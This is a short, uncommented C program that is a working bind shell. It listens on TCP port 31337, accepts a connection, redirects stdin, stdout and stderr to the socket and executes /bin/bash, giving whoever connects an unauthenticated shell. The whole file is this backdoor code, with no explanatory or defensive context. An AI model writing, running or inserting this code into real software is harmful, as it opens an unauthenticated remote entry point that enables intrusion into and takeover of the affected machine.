#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
int main(void)
{
 int socket_fd;
 int client_fd;
 int port = 31337;
 struct sockaddr_in socket_struct;
 socket_fd = socket(AF_INET, SOCK_STREAM, 0);
 socket_struct.sin_family = AF_INET; 
 socket_struct.sin_port = htons(port); 
 socket_struct.sin_addr.s_addr = INADDR_ANY;
 bind(socket_fd, (struct sockaddr *) &socket_struct, sizeof(socket_struct));
 listen(socket_fd, 0);
 client_fd = accept(socket_fd, NULL, NULL);
 for (int i = 0; i < 3; i++)
 {
    dup2(client_fd , i);
 }
 execve("/bin/bash", NULL, NULL);
}
